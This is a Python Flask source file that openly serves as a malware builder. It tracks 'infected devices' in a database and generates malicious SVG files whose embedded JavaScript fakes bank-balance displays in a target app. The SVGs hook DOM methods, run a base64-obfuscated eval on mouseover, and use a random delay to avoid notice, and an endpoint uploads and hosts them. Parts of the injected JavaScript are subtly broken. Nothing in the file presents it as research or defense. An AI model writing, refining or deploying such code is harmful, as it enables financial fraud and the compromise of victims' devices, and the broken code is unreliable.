from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
import uuid
import os
import random

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL') or 'postgresql://user:password@localhost/malware'
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Enable CORS
CORS(app)

db = SQLAlchemy(app)

class InfectedDevice(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(120), unique=True)
    target_app = db.Column(db.String(120))
    target_amount = db.Column(db.Float)
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())

def generate_enhanced_payload(device_id, target_app, target_amount):
    selectors = [
        '.balance', '[data-testid="balance"]', '#balance', 
        '.account-balance', '[class*="balance"]'
    ]
    
    js_payload = f"""
    function overrideBalance() {{
        {";".join([
            f"Array.from(document.querySelectorAll('{sel}')).forEach(el => el.innerText = '{target_amount}');"
            for sel in selectors
        ])}
        
        Object.defineProperty(document, 'querySelectorAll', {{
            value: function(selector) {{
                const elements = Array.prototype.call(this, selector);
                if (selectors.some(s => selector.includes(s))) {{
                    elements.forEach(el => {{
                        Object.defineProperty(el, 'innerText', {{
                            get: () => '{target_amount}',
                            set: () => {{}}
                        }});
                    }});
                }}
                return elements;
            }}
        }});
    }}
    
    setInterval(overrideBalance, 500);
    window.addEventListener('load', overrideBalance);
    """
    
    return f"""<svg xmlns="http://www.w3.org/2000/svg">
        <script>{js_payload}</script>
        <rect x="0" y="0" width="1" height="1" 
              onmouseover="eval(atob('ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJhbGFuY2UnKS5pbm5lckhUTUw9JzEwMDAwMDAn'))"/>
    </svg>"""

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    try:
        device_id = request.json.get('device_id')
        target_app = request.json.get('target_app')
        target_amount = request.json.get('target_amount')
        
        malware = InfectedDevice(device_id=device_id, target_app=target_app, target_amount=target_amount)
        db.session.add(malware)
        db.session.commit()
        
        payload = generate_enhanced_payload(device_id, target_app, target_amount)
        delay = random.randint(1000, 5000)
        payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
        payload = payload.replace('), 500)', f'), {delay})')
        
        return jsonify({'payload': payload})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

@app.before_first_request
def create_tables():
    try:
        db.create_all()
    except Exception as e:
        print(f"Error creating tables: {e}")
        db.session.rollback()

if __name__ == '__main__':
    db.create_all()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
